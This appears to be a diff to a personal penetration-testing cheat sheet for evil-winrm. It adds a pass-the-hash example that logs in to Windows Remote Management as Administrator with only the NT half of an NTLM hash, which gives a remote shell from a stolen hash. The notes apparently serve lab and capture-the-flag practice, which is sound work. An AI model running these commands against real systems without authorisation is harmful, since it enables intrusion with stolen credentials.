@@ -1,3 +1,10 @@
+# evil-winrm
+
 # Connect to machine
 evil-winrm -i 10.10.10.175 -u <username> -p <password>
 
+# Connect to a machine with the Hash (Pass The Hash)
+;; be sure to pass only the NT part of the NTLM hash, so if the hash is:
+;; aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+;; we only need to pass the second part like in the below example
+./evil-winrm.rb -u Administrator -i 10.10.213.232 -H "0e0363213e37b94221497260b0bcb4fc"
